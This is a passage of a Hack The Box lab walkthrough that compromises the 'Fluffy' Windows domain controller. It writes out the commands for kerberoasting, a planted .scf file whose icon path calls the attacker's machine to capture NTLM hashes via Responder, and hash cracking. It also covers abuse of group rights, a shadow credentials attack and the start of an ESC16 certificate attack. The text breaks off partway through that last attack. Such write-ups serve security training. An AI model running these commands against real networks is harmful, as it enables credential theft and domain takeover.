+++
author = ["bloodstiller"]
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Active-Directory", "scf", "smb", "poisoning", "dacl", "genericwrite", "genericall", "kerberos", "kerberoasting", "esc16", "Authority", "Certificate", "Template", "CA", "SCF", "file", "Golden", "Ticket"]
draft = true
title = "fluffy HTB Walkthrough"
date = 2025-01-14
+++

## fluffy Hack The Box Walkthrough/Writeup: {#fluffy-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/fluffy>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### Assumed Breach Box: {#assumed-breach-box}

-   This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
-   This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.
    -   **User**: j.fleischman
    -   **Pass**: J0elTHEM4n1990!
-   +Note+:
    -   Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
        -   This ensures I don’t overlook any findings just because access is available.
        -   Comprehensive documentation of all discoveries remains essential.


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

```shell
#Command
nmap $box -Pn -oA TCPbasicScan

#Results
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 19:13 BST
Nmap scan report for 10.129.189.235
Host is up (0.022s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

```

-   **Initial thoughts**:
    -   DNS
    -   kerberos
    -   LDAP, LDAPssl
    -   SMB
    -   RPC
    -   WSAN
    -   Due the services running I think it's safe to assume this is a domain controller as it's running DNS, Kerberos, LDAP &amp; RPC.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:
    ```shell
    #Command
    sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP

    #Results
    [sudo] password for kali:
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 19:13 BST
    Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 66.88% done; ETC: 19:16 (0:00:57 remaining)
    Nmap scan report for 10.129.189.235
    Host is up (0.034s latency).
    Not shown: 65517 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 01:16:39Z)
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.fluffy.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
    | Not valid before: 2025-04-17T16:04:17
    |_Not valid after:  2026-04-17T16:04:17
    |_ssl-date: 2025-06-04T01:18:13+00:00; +7h00m00s from scanner time.
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-06-04T01:18:13+00:00; +7h00m01s from scanner time.
    | ssl-cert: Subject: commonName=DC01.fluffy.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
    | Not valid before: 2025-04-17T16:04:17
    |_Not valid after:  2026-04-17T16:04:17
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.fluffy.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
    | Not valid before: 2025-04-17T16:04:17
    |_Not valid after:  2026-04-17T16:04:17
    |_ssl-date: 2025-06-04T01:18:13+00:00; +7h00m00s from scanner time.
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC01.fluffy.htb
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
    | Not valid before: 2025-04-17T16:04:17
    |_Not valid after:  2026-04-17T16:04:17
    |_ssl-date: 2025-06-04T01:18:13+00:00; +7h00m01s from scanner time.
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49686/tcp open  msrpc         Microsoft Windows RPC
    49703/tcp open  msrpc         Microsoft Windows RPC
    49716/tcp open  msrpc         Microsoft Windows RPC
    49738/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
    OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
    Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2025-06-04T01:17:34
    |_  start_date: N/A
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 268.33 seconds

    ```

    -   **Findings**: We can see the domain name is fluffy.htb and the host is a DCO1 so it's a domain controller as expected.


### LDAP `389`: {#ldap-389}


#### Attempting To Use LDAP Anonymous Bind To Enumerate Further: {#attempting-to-use-ldap-anonymous-bind-to-enumerate-further}

If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.

-   We can actually retrieve a significant amount of information via anonymous bind such as:
    -   A list of all users
    -   A list of all groups
    -   A list of all computers.
    -   User account attributes.
    -   The domain password policy.
    -   Enumerate users who are susceptible to AS-REPRoasting.
    -   Passwords stored in the description fields

The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here

-   <https://github.com/bloodstiller/ldapire>
-   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>

It will dump general information &amp; also detailed &amp; simple information including:

-   Groups
-   Computers
-   Users
-   All domain objects
-   A file containing all description fields
-   It will also search the domain for any service/svc accounts and place them in a folder too.

Let's run it and see what we get back.

```shell
python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass
```

It turns out the anonymous bind is (+NOT+) enabled and we get the below information.

```shell
------------------------------------------------------------
 Connection Attempts
------------------------------------------------------------
  • Attempting SSL connection...
  ✗ Failed to connect with SSL
  • Attempting non-SSL connection...
  ✓ Connected successfully using anonymous bind

------------------------------------------------------------
 Security Warning
------------------------------------------------------------
  ⚠️  WARNING: Connected using Anonymous Bind
  ⚠️  This is a security risk and should be disabled
```

We do still get some very valuable information. Here we have the full server name &amp; domain name

```shell
   ------------------------------------------------------------
    Server Information
   ------------------------------------------------------------
   • IP Address  : 10.129.189.235
   • Domain Name : fluffy.htb
   • Server Name : DC01
```

We also get the domain functionality level.

```shell
  • Forest Level: 7
  • Domain Level: 7
```

The functionality level determines the minimum version of Windows server that can be used for a DC.

Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.

Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

| Functional Level Number | Corresponding OS            |
|-------------------------|-----------------------------|
| 0                       | Windows 2000                |
| 1                       | Windows Server 2003 Interim |
| 2                       | Windows Server 2003         |
| 3                       | Windows Server 2008         |
| 4                       | Windows Server 2008 R2      |
| 5                       | Windows Server 2012         |
| 6                       | Windows Server 2012 R2      |
| 7                       | Windows Server 2016         |
| 8                       | Windows Server 2019         |
| 9                       | Windows Server 2022         |

-   +Note+:
    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.
    -   Any, host OS can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
    -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>


### Updating `/etc/hosts` &amp; Variables: {#updating-etc-hosts-and-variables}

I have a script I use to update variables in my `.zshrc` and as we now know then domain and machine values lets store them.

```shell
update_var domain "fluffy.htb"
update_var machine "DC01"
```

Now, I will update  `/etc/hosts` for DNS and &amp; further LDAP Queries.

-   I update my `/etc/hosts` file to enable tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration and other tools that require DNS or LDAP for queries:
    ```shell
    sudo echo "$box   $domain $machine.$domain $machine" | sudo tee -a /etc/hosts
    ```


### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.

```shell
sudo ntpdate -s $domain
```

+Note+: I am doing this now as we have the DNS name etc.


### DNS `53`: {#dns-53}

Let's use dnsenum to find if there are any interesting DNS records being served.

```shell
dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain
```


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

As kerberos is running we can use Kerbrute for bruteforcing usernames/emails.

```shell
kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
```

No hits.

{{< figure src="/ox-hugo/2025-06-03-194737_.png" >}}


#### Using netexec for ASReproasting: {#using-netexec-for-asreproasting}

Let's try and `asreproast` with netexec.

```shell
netexec ldap $box -u $user -p $pass --asreproast asrep.txt

  #+begin_src shell
# This one will just work, without having to pass anything else.
impacket-GetNPUsers $domain/ -request
```

No hits
![](/ox-hugo/2025-06-03-194833_.png)


#### Kerberoasting Using Our Creds To Get 3 Tickets: {#kerberoasting-using-our-creds-to-get-3-tickets}

As we have creds we can kerberoast.

```shell
netexec ldap $box -u $user -p $pass --kerberoast kerb.txt
```

As we can see we have gotten 3 valid tickets all service accounts.
![](/ox-hugo/2025-06-03-195207_.png)

Let's attempt to crack the tickets.

```shell
#Cracking
hashcat -m 13100 kerb.txt ~/Wordlists/rockyou.txt
```

Unfortunatley we were unable to crack these tickets. We still have to perform our credentialed enumeration though so plenty to do!
![](/ox-hugo/2025-06-03-195543_.png)


### Enumerating Users with Impacket-lookupsid: {#enumerating-users-with-impacket-lookupsid}

We can use `impacket-lookupsid` to enumerate users &amp; groups on the domain, well anything that has a SID.

```shell
impacket-lookupsid $domain/$user@$machine.$domain -domain-sids > sids.txt
```

We now have some valuable users and groups we can use later on.

{{< figure src="/ox-hugo/2025-06-03-202307_.png" >}}


### Enumerating The CA Using Certipy-ad: {#enumerating-the-ca-using-certipy-ad}

As this is a DC01 and it's running DNS let's see if we can enumerate the CA for vulnerable certificates using certipy-ad.

```shell
certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
```

Unfortunatley no cert templates could be found.
![](/ox-hugo/2025-06-04-064543_.png)


### Performing a Bloodhound Collection: {#performing-a-bloodhound-collection}

As we have creds we should perform a bloodhound collection to get a better lay of the land.

```shell
bloodhound-python -d $domain -ns $box -c All -u $user -p $pass
```

We then import these into bloodhound for investigation.


#### Bloodhound Findings: {#bloodhound-findings}

**How many domain admins**:
1 - ADMINSTRATOR@FLUFFY.HTB

**What users have DC Sync Privileges**:
This is the standard, members of the Administrators, Domain Admins &amp; Enterprise Admins group.

**Our users rights**:
Nothing exciting.

**How many users in the domain**:
There are only 8 members in the entire domain.

**Interesting users**:
The `svc` accounts are members of the "SERVICE ACCOUNTS" group which has `GenericWrite` over all members of the group, which means if we can gain control of a member of the group then we can control the whole group &amp; it's members.
![](/ox-hugo/2025-06-03-200758_.png)


### SMB `445`: {#smb-445}


#### Enumerating SMB shares using netexec: {#enumerating-smb-shares-using-netexec}

```shell
netexec smb $box -u $user -p $pass --shares
```

We have R/W access to the IT share
![](/ox-hugo/2025-06-03-195814_.png)

Lets spider them for ease and check the results

```shell
netexec smb $box -u $user -p $pass -M spider_plus
```

26 files found
![](/ox-hugo/2025-06-03-200001_.png)

Lets see if there is anything of note:

```shell
cat /home/kali/.nxc/modules/nxc_spider_plus/*.json | grep -Ei "keepass|pdf|zip"
```

![](/ox-hugo/2025-06-03-200805_.png)
As we can see there are KeePass password manager files a `.pdf` and a `.zip`. So lets take a look at that.

+Note+: The reason I am grepping for those specific strings is because I initially searched the json manually and this was the best way to show you what was interesting


#### Downloading The Contents of IT Share with smbget: {#downloading-the-contents-of-it-share-with-smbget}


#### Using smbclient: {#using-smbclient}

```shell
smbclient -U $domain\\$user "\\\\$box\\IT"
```

Let's download the contents of the share, we can do this from within smbclient.

```shell
prompt
mget *
```

{{< figure src="/ox-hugo/2025-06-03-201812_.png" >}}


### Examining the contents of the IT Share Files: {#examining-the-contents-of-the-it-share-files}


#### KeePass ZIP. {#keepass-zip-dot}

After unzipping this folder it appears to be a standard `.zip` that can be downloaded from the KeePass website.


#### Upgrade_Notice.pdf: {#upgrade-notice-dot-pdf}

This file is interesting it details a list of vulnerabilities that are present in their environment
![](/ox-hugo/2025-06-04-063534_.png)

The bottom also contains an email address.
![](/ox-hugo/2025-06-04-063559_.png)


### Investigating the vulnerabilities listed in the PDF: {#investigating-the-vulnerabilities-listed-in-the-pdf}

The fact that we have a list of vulnerabilities that the environment is suffering from is very useful as it will give us a potential path forward.


#### Critical Vulnerabilities: {#critical-vulnerabilities}


##### CVE-2025-24996: {#cve-2025-24996}

<https://nvd.nist.gov/vuln/detail/CVE-2025-24996>

> External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.

As far as I can find there is no public POC of this or proof of it happening in the wild, so let's shleve this and move on.


##### CVE-2025-24071: {#cve-2025-24071}

<https://nvd.nist.gov/vuln/detail/CVE-2025-24071>

> Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.


#### High Vulnerabilities: {#high-vulnerabilities}


##### CVE-2025-46785: {#cve-2025-46785}

<https://nvd.nist.gov/vuln/detail/CVE-2025-46785>

> Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.


##### CVE-2025-29968: {#cve-2025-29968}

<https://nvd.nist.gov/vuln/detail/cve-2025-29968>


#### Medium Vulnerability CVE-2025-21193: {#medium-vulnerability-cve-2025-21193}

<https://nvd.nist.gov/vuln/detail/cve-2025-21193>


#### Low Vulnerability CVE-2025-3445: {#low-vulnerability-cve-2025-3445}

<https://nvd.nist.gov/vuln/detail/CVE-2025-3445>


## 2. Lateral Movement - Pivoting to `p.agila`: {#2-dot-lateral-movement-pivoting-to-p-dot-agila}


### Capturing `p.agila` NTLM hash using a malicious `scf` file: {#capturing-p-dot-agila-ntlm-hash-using-a-malicious-scf-file}

One thing we can do is write to the share which is interesting as if we can write to the share we can place a malicious `.scf` file and have a user click or view it to then have them authenticate back to our malicious server so we can capture their NTLM hash. To do this we will use responder and netexec's built in `drop-sc` module.


#### Side Quest: What is an scf file? {#side-quest-what-is-an-scf-file}

An `.scf` (Shell Command File) is a simple Windows file type used to execute basic shell commands. It's commonly used for actions like toggling the desktop or setting folder icons, it can be abused by attackers to trigger outbound authentication attempts when a user views a directory containing a malicious `.scf`. This makes it especially handy for capturing NTLM hashes via SMB.


#### Automated Malicious `.scf` creation using Netexec: {#automated-malicious-dot-scf-creation-using-netexec}

First we setup responder to listen back for the connection.

```shell
sudo responder -v -I tun0
```

Now we use the `drop-sc` module in netexec.

```shell
netexec smb $box -u $user -p $pass -M drop-sc -o URL=\\\\10.10.14.128\\secret SHARE=IT FILENAME=secret
```

As you can see we immediatley get a connectcion back from the target.
![](/ox-hugo/2025-06-04-071413_.png)


#### Manual Malicious `scf` File Attack: {#manual-malicious-scf-file-attack}

It is also possible to manually create a malicious `.scf`, I did this on the box Driver: -

-   <https://bloodstiller.com/walkthroughs/driver-box/#using-an-scf-file-to-get-a-users-ntlm-hash>

To do this we create a file with the following content and save it as a `.scf` file.

```shell
[Shell]
Command=2
IconFile=\\10.10.14.128\secret\secret.ico
[Taskbar]
Command=ToggleDesktop
```

-   +Note+:
    -   The `IconFile` is as it sounds the icon for the file, as soon as the user opens the directory/share their machine will reach out to my attack machine to retrieve the icon and when they do they will send their NTLM hash which we can capture.
    -   We put an `@` at the start of the name so it appears at the top and ensure it is executed as soon as the user accesses the share it is in. This way the user does not need to click on it and it will trigger. So it could be called `@secret.scf`


### Cracking The `p.agila` hash: {#cracking-the-p-dot-agila-hash}

Now we have recovered their has we can crack it.

```shell
hashcat -m 5600 Hashes.txt ~/Wordlists/rockyou.txt
```

{{< figure src="/ox-hugo/2025-06-04-071838_.png" >}}

Verifying their creds using netexec. As we can see they have no more permissions than we already have.
![](/ox-hugo/2025-06-04-072051_.png)


### Discovering `p.agila` Has Control Over The "Service Accounts" Groups {#discovering-p-dot-agila-has-control-over-the-service-accounts-groups}

Checking bloodhound we can see we are a member of the "SERVICE ACCOUNT MANAGERS" group.

{{< figure src="/ox-hugo/2025-06-04-072158_.png" >}}

This group has `GenericAll` over the group "SERVICE ACCOUNTS"
![](/ox-hugo/2025-06-04-072304_.png)

And as we saw earlier the "SERVICE ACCOUNTS" group has `GenericWrite` over the service accounts it contains.
![](/ox-hugo/2025-06-04-072437_.png)

This gives us a clear path forward to take over all the service accounts if we wish, however I am going to focus on the `CA_SVC` account, the reason being is that in my experience the microsoft Certificate Authority is often misconfigured and this can give us a clear path to domain takeover. If that target does not workout I would then target `WINRM_SVC` as they are part of the "REMOTE MANAGEMENT USERS" group
![](/ox-hugo/2025-06-11-081541_.png)


### Side Quest: `GenericAll` &amp; `GenericWrite`: {#side-quest-genericall-and-genericwrite}


#### `GenericAll` Privilege: {#genericall-privilege}

-   **Display Name**: `GenericAll`
-   **Common Name**: `GA/RIGHT_GENERIC_ALL`
-   **Hex Value**: `0x10000000`
-   **Interpretation**: Allows creating or deleting child objects, deleting a subtree, reading and writing properties, examining child objects and the object itself, adding and removing the object from the directory, and reading or writing with an extended right.
    -   This is equivalent to the object-specific access rights bits (DE | RC | WD | WO | CC | DC | DT | RP | WP | LC | LO | CR | VW) for AD objects.
    -   **In simple terms**:
        -   This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.
    -   **Attack Options**:
        -   **Users**:
            -   If we have this privilege over a user we can use a targeted kerberoasting attack &amp; add an SPN to the user, request that ticket and then crack it offline.
        -   **Groups**:
            -   We can then add ourseleves or other users to the group, this is especially useful if the group grants privileges by virtue of membership.
        -   **Computers**:
            -   Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to enable a **Resource-Based Constrained Delegation (RBCD)** attack.
                -   <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution>
                -   We add a fake computer to the domain &amp; configure the computer we GenericAll permissions over to allow the fake computer to act on behalf of it. This enables us to impersonate a high-privileged user on the domain and request a kerberos ticket for that user we can then either crack or use in a pass the ticket attack.


#### `GenericWrite` Privilege: {#genericwrite-privilege}

-   **Display Name**: `GenericWrite`
-   **Common Name**: `GW/RIGHT_GENERIC_WRITE`
-   **Hex Value**: `0x40000000`
-   **Interpretation**: Grants the ability to read permissions and write all properties (including attributes) on the target object, as well as perform all validated writes (special kinds of writes that follow specific rules).
    -   This is equivalent to the object-specific access rights bits (RC | WP | VW) for Active Directory objects.
    -   **In simple terms**:
        -   This permission gives an attacker significant control over the object. They can modify many of its attributes (like SPNs, logon scripts, and UPNs), enabling a range of abuse techniques, although it doesn't allow full deletion or child object creation like GenericAll.
    -   **Attack Options**:
        -   **Users**:
            -   Modify the target user’s ServicePrincipalName (SPN) to add a custom SPN, then request a Kerberos ticket for it (targeted Kerberoasting).
            -   Change user attributes such as the login script path or `msDS-KeyCredentialLink` (used in shadow credential attacks).
            -   Replace or inject a certificate for PKINIT-based attacks (e.g., <https://github.com/GhostPack/Rubeus> <https://github.com/GhostPack/Certify>
        -   **Groups**:
            -   Modify group description or other modifiable attributes, though direct membership changes are not possible with just GenericWrite.
        -   **Computers**:
            -   Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to enable a **Resource-Based Constrained Delegation (RBCD)** attack.
                -   Similar to the GenericAll case, but only the attribute modification is permitted—not full object control.
                -   For more details: <https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution>


## 3. Lateral Movement - Pivoting to `ca_svc`: {#3-dot-lateral-movement-pivoting-to-ca-svc}


### Overview of Attack Path: {#overview-of-attack-path}

First we will add our user `p.agila` to the "Service Accounts" group so they inherit the `GenericWrite` attribute over the service accounts. We will then perform a shadow credentials attack to add shadow credentials to the `CA_SVC` account so we can retrieve their hash.


### Adding `p.agila` To The "Service Accounts" Group With `net rpc`: {#adding-p-dot-agila-to-the-service-accounts-group-with-net-rpc}

First we use `net rpc addmem` function to add our user to the group "SERVICE ACCOUNTS".

```shell
net rpc group addmem "Service Accounts" "$user" -U "$domain"/"$user"%"$pass" -S "DC01"
```

{{< figure src="/ox-hugo/2025-06-04-202212_.png" >}}

We then use the net rpc MEMBERS function to Verify they have been added

```shell
net rpc group MEMBERS "Service Accounts" -U "$domain"/"$user"%"$pass" -S "DC01"
```

{{< figure src="/ox-hugo/2025-06-04-202508_.png" >}}


### Performing the Shadow Credentials Attack on `ca_svc`: {#performing-the-shadow-credentials-attack-on-ca-svc}


#### Side Quest: What's a shadow credentials attack? {#side-quest-what-s-a-shadow-credentials-attack}

The Shadow Credentials attack is an advanced technique that exploits Active Directory's certificate-based authentication mechanism to compromise user accounts without changing their passwords. This attack leverages the `msDS-KeyCredentialLink` attribute to add a malicious certificate, allowing an attacker to impersonate the target user stealthily.

**To put it simply**: If we have the `WriteProperty` privilege (specifically for the `msDS-KeyCredentialLink` attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.

I have a full article on my blog regarding this attack here: <https://bloodstiller.com/articles/shadowcredentialsattack/>


#### Using pywhisker To Perform A Shadow Credentials Attack Against `ca_svc`: {#using-pywhisker-to-perform-a-shadow-credentials-attack-against-ca-svc}


##### Install Required Programs: {#install-required-programs}

We will need two programs to perform this attack [pywhisker](https://github.com/ShutdownRepo/pywhisker) &amp; [pkinit](https://github.com/dirkjanm/PKINITtools).

<!--list-separator-->

-  pywhisker:

    If you have not setup pywhisker before run the following commands to download the repo and setup a python virtual environment.

    ```shell
    git clone https://github.com/ShutdownRepo/pywhisker.git
    cd pywhisker
    python3 -m venv whisker
    source whisker/bin/activate
    pip install -r requirements.txt
    ```

<!--list-separator-->

-  pkinittools:

    If you have not setup pkinittools before run the following commands to download the repo and setup a python virtual environment.

    ```shell
    git clone https://github.com/dirkjanm/PKINITtools.git
    cd pkinit
    python -m venv pk
    source pk/bin/activate
    pip install -r requirements.txt
    ```


##### 1. Add shadow credentials to the `ca_svc` account &amp; export `.PEM`: {#1-dot-add-shadow-credentials-to-the-ca-svc-account-and-export-dot-pem}

```shell
python3 pywhisker.py -d $domain -u $user -p $pass --target "CA_SVC" --action "add" --filename CACert --export PEM
```

{{< figure src="/ox-hugo/2025-06-05-063923_.png" >}}

-   +Note+: If you do this and you get the below about having insufficient rights this is due to the fact that there is a mechanism on the host where the user `p.agila` whom we added to the "service accounts" group is removed after x amount of time.
{{< figure src="/ox-hugo/2025-06-05-063457_.png" >}}


##### 2. Requesting a TGT for `ca_svc` with PKINITtools `getgtgkinit`: {#2-dot-requesting-a-tgt-for-ca-svc-with-pkinittools-getgtgkinit}

Now we perform the same process again to be able to extract their hash by using the `.pem` files we have retrieved to export a `.ccache` we can authenticate with.

```shell
python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache
```

{{< figure src="/ox-hugo/2025-06-05-064207_.png" >}}


##### 3. Load retrieved `.ccache` into Memory: {#3-dot-load-retrieved-dot-ccache-into-memory}

Next we will load the `.ccache` into our `KRB5CCNAME` variable as we will need this for next step:

```shell
export KRB5CCNAME=./ca_svc.ccache
```


##### 4. Requesting the `ca_svc` user hash with PKINITtools `getnthash`: {#4-dot-requesting-the-ca-svc-user-hash-with-pkinittools-getnthash}

Extract the NTHash for the `ca_svc` user:

```shell
python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key d482c9ee7d8bb9950ad6a150dc2ebd2cfef26eed370b16fc48fb903d90c55e2e $domain/CA_SVC
```

{{< figure src="/ox-hugo/2025-06-05-064350_.png" >}}

Validate the retrieved hash.

```shell
netexec smb $box -u $user -H $hash --shares
```

{{< figure src="/ox-hugo/2025-06-05-064733_.png" >}}


### Re-run python-bloodhound As `ca_svc`: {#re-run-python-bloodhound-as-ca-svc}

It's always good to re-run bloodhound as any new users we have.

```shell
bloodhound-python -d $domain -ns $box -c All -u $user --hashes \:$hash
```

+Note+: No additional results were found.


## 4. Privilege Escalation: {#4-dot-privilege-escalation}


### Running `certipy-ad` As `ca_svc` To Enumerate The CA: {#running-certipy-ad-as-ca-svc-to-enumerate-the-ca}

As we now have control over the service ca account we should re-run certipy-ad to check if we have access to any other certificate templates as this user.

```shell
certipy-ad find -vulnerable -u $user@$domain -hashes $hash -dc-ip $box
```

{{< figure src="/ox-hugo/2025-06-05-065438_.png" >}}

We can see that the target is vulnerable to ESC16 attack.
![](/ox-hugo/2025-06-05-065737_.png)

If we check the wiki we are given the steps needed to exploit this attack chain:
<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally>


### Side-Quest: What is the ESC16 Vulnerability: {#side-quest-what-is-the-esc16-vulnerability}

The ESC16 vulnerability/misconfiguration is where the CA has configured the `szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2)` security extension to be disabled from inclusion in all certificates it issues. This security extension is a SID extension, that was introduces with the May 2022 (KB5014754) security updates and is used to enable DC's to map a certificate to a user/computer account SID for authentication.

As this extension is disabled this means the security extension will be absent in every certificate issued by the CA, meaning the DC is not working in `StrongCertificateBindingEnforcement`, and this will result in legacy certificate mapping methods being used which are based on UPN/DNS name found in the certificate SAN. This in turn leaves the CA vulnerable to attack vectors such as CVE-2022-26923.

What this means in this case is that, as the `szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2)` is disabled and we are the `CA_SVC` this means we can enroll any client/user in any certificate. And we have `GenericWrite` over our own account this means we can perform the attack on ourselves and elevate to Administrator.

Looking at the entry in the ceritipy wiki we can see the following steps are required.

> -   Change the victim account's UPN to match a target privileged account's sAMAccountName.
> -   Request a certificate (which will automatically lack the SID security extension due to the CA's ESC16 configuration).
> -   Revert the UPN change.
> -   Use the certificate to impersonate the target.


### Performing The `ESC16` Attack To Get Root Access: {#performing-the-esc16-attack-to-get-root-access}

We can just follow the steps on the page <https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally> however there are some steps we can skip.

**Step 1**: Update the victim account's UPN to the target administrator's sAMAccountName.

```shell
certipy-ad account -u "$user@$domain" -hashes \:$hash -dc-ip $box -user 'ca_svc' -upn 'administrator' update
```

{{< figure src="/ox-hugo/2025-06-11-071454_.png" >}}

**Step 2**: Request a certificate as the "victim" user from any suitable client authentication template (e.g., "User")

```shell
